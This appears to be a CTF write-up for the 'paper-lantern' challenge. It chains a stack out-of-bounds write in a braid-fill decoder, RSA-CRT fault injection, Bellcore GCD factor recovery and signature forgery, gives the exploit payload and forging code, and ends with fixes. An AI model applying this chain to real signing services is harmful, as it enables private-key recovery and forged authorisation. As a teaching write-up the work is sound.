---
title: "anti-slop CTF — paper-lantern (Pwn/Crypto)"
date: 2026-06-15 00:00:00 +0800
categories: [CTF, Pwn]
tags: [antislop, oob-write, rsa-crt, bellcore, fault-injection, signature-forgery]
---

**Category:** Pwn / Crypto  
**Binary:** `paper-lantern` (server)  
**Flag:** `slopped{faulted_crt_seams_burn_open}`  
**Vulnerability:** Braid-fill OOB stack write → RSA-CRT fault injection → Bellcore factor recovery → signature forgery

## Summary

The server implements a capsule protocol where records are signed with RSA-FDH. One record opcode (`0x7f`) prints the flag, but the signing path refuses to sign any capsule containing it. The intended path is therefore to forge a valid RSA signature for the forbidden capsule. A stack out-of-bounds write in the `FT_COMMENT` braid-fill decoder lets an unauthenticated client corrupt RSA-CRT fault-control fields on the stack. One subsequent sign request then produces a faulty signature; combining that with a correct signature recovers a prime factor of the modulus via GCD. With `p` and `q` in hand, the private exponent is reconstructed and the signature forged.

## Protocol

Every client frame carries a 4-byte header:

```
type: 1 byte
seq:  1 byte
len:  2 bytes (little-endian)
```

After receiving the server banner, the client must handshake:

```python
send(FT_HELLO, b"\x01")     # 0x10
recv()                       # RT_MODE
send(FT_ACK_STRICT)          # 0x12
recv()                       # RT_MODE
```

Relevant frame types:

| Type | Opcode | Description |
|------|--------|-------------|
| `FT_APPEND` | `0x21` | Add a record to the current capsule |
| `FT_SIGN` | `0x22` | RSA-FDH sign the current capsule |
| `FT_COMMENT` | `0x23` | Decode a compressed comment stream into a stack buffer |
| `FT_RUN` | `0x24` | Verify signature and execute the capsule |

Record opcodes of interest:

| Opcode | Meaning |
|--------|---------|
| `0x01` | `REC_TEXT` — length byte, then text bytes |
| `0x7f` | Print flag |

## The Signing Gate

The signing serializer maps each record into a one-line canonical form. For opcode `0x7f` it returns an error when called by `FT_SIGN` (`param_2 = 0`):

```c
if (cVar2 != '\x7f') {
    return 0xffffffff;          // non-flag record: error
}
if (param_2 == 0) {
    return 0xfffffffe;          // FT_SIGN path: "unsafe opcode"
}
*(param_3 + uVar6) = 0x46;    // FT_RUN path: serialize as "F"
```

`FT_RUN` uses `param_2 = 1`, so it accepts `0x7f` during serialization and verifies the signature against the serialized byte `b"F"`. The goal is therefore to forge `RSA_sign("F")` without the private key.

## Bug: Braid-Fill Out-of-Bounds Write

`FT_COMMENT` decodes a run-length stream into a 72-byte stack buffer `local_e67`. Opcodes `0xe0..0xef` trigger a "braid fill": repeat a byte for `(op & 0xF) + 17` iterations (17–32 bytes). The bounds check, however, uses only the low two bits of the opcode:

```c
// Bound check (wrong — uses op & 3):
if (0x48 < (uVar21 & 3) + uVar19) {
    reject("braid exceeds seam");
}

// Write (correct count — uses op & 0xF):
lVar15 = (uVar21 & 0xf) + 0x11;   // 17..32 bytes
for (; lVar15 != 0; lVar15--) {
    *pbVar25++ = bVar20;
}
```

For opcode `0xe0`, the check adds `0` to the current position, but the loop writes 17 bytes. If the decoded position is exactly `0x48` (72), the check passes:

```
0x48 + (0xe0 & 3) = 0x48 + 0 = 0x48  ≤ 0x48  ✓
```

But the write starts at `local_e67 + 0x48` — past the end of the buffer — and runs for 17 bytes.

Stack layout immediately after `local_e67`:

```
local_e67[72]   comment bytes
local_e1f       comment length
local_e1e       CRT fault enable flag
local_e1d       CRT branch selector (p-side vs q-side)
local_e1c       CRT fault delta
local_e1b       gate byte (length gate)
local_e1a       seam byte (digest gate)
...
```

The exploit payload writes exactly 72 comment bytes first, then triggers the buggy braid:

```python
payload  = bytes([0x3f]) + b"A" * 64   # literal span, 64 bytes
payload += bytes([0x07]) + b"B" * 8    # literal span, 8 bytes  (total: 72)
payload += bytes([0xe0, x])             # buggy braid, writes byte x past offset 72
```

This overwrites `local_e1e` through `local_e1a` all with `x`, enabling the fault path.

## RSA-CRT Fault Injection

The signing function computes:

```
sp  = m^dp mod p
sq  = m^dq mod q
sig = sq + q * ((qinv * (sp - sq)) mod p)
```

After computing `sp` and `sq`, if the fault fields are set, the code perturbs one residue:

```c
if ((local_e1e != '\0') &&
    ((byte)(sha256(serialized)[0] ^ seam_byte) == local_e1a) &&
    (((local_e1b ^ len(serialized)) & 7) == 0)) {

    delta = local_e1c ? local_e1c : 'A';
    if ((local_e1d & 1) == 0)
        sp = sp + delta mod p;     // corrupt the p-residue
    else
        sq = sq + delta mod q;

    local_e1e = 0;
}
```

Two gate checks must pass simultaneously:

- `(seam_value(comment) ^ sha256(serialized)[0]) == x`
- `(x ^ len(serialized)) & 7 == 0`

The seam value is a deterministic rolling XOR over the comment bytes. The exploit brute-forces a short `REC_TEXT` record (iterating text lengths 0–48) until both conditions are satisfied. For the remote server this was a zero-length `REC_TEXT`:

```
serialized = b"T\x00"   (opcode "T", length 0)
fault byte x = 0x5a
```

## Bellcore Attack: Recovering a Prime Factor

The attack requires two signatures of the same signable capsule:

1. **Good signature** — no comment payload, no fault.
2. **Bad signature** — with the OOB comment payload, fault fires on the p-residue.

A correct RSA signature verifies modulo both primes. A faulty signature verifies modulo only one. Therefore:

```python
diff = (pow(bad_sig, e, n) - pow(good_sig, e, n)) % n
p    = gcd(diff, n)
q    = n // p
```

## Forging the Signature

With `p` and `q` recovered:

```python
phi = (p - 1) * (q - 1)
d   = pow(65537, -1, phi)
```

The server's FDH encoding for the forbidden capsule (serialized as `b"F"`):

```python
digest = sha256(b"F")
left   = sha256(b"paper-lantern/v4:msg" + digest)
right  = sha256(b"paper-lantern/v4:aux" + digest)
m      = int.from_bytes(left + right, "big") % n

forged_sig = pow(m, d, n).to_bytes(64, "big")
```

## Emitting the Flag

On a fresh connection:

```python
handshake(c)
c.send(FT_APPEND, b"\x7f")    # append the forbidden flag record
c.send(FT_RUN, forged_sig)    # FT_RUN verifies, then executes
```

`FT_RUN` serializes `0x7f` as `b"F"` (allowed on the run path), verifies the forged signature against `m = FDH("F")` — which passes — and executes the flag opcode. The server returns:

```
slopped{faulted_crt_seams_burn_open}
```

## Exploit Chain

```
FT_INFO
  └─ recover n, e

Brute-force REC_TEXT length
  └─ find (record, x) satisfying both gate checks

FT_SIGN (no comment)   → good_sig
FT_COMMENT(oob_payload) + FT_SIGN → bad_sig

gcd(bad_sig^e - good_sig^e, n) → p, q
  └─ d = e⁻¹ mod φ(n)
       └─ FDH("F") → m
            └─ forge_sig = m^d mod n
                 └─ FT_APPEND(0x7f) + FT_RUN(forge_sig) → FLAG
```

## Fix

**Memory safety:** validate the actual braid-fill write length, not just the low two bits:

```c
len = (op & 0xF) + 17;
if (out_pos + len > 72) { reject; }
```

**Cryptographic hardening:** verify the CRT signature before returning it:

```c
if (pow(sig, e, n) != m) { reject; }
```

This is the standard Bellcore countermeasure and would prevent factor recovery even if a fault were somehow triggered.
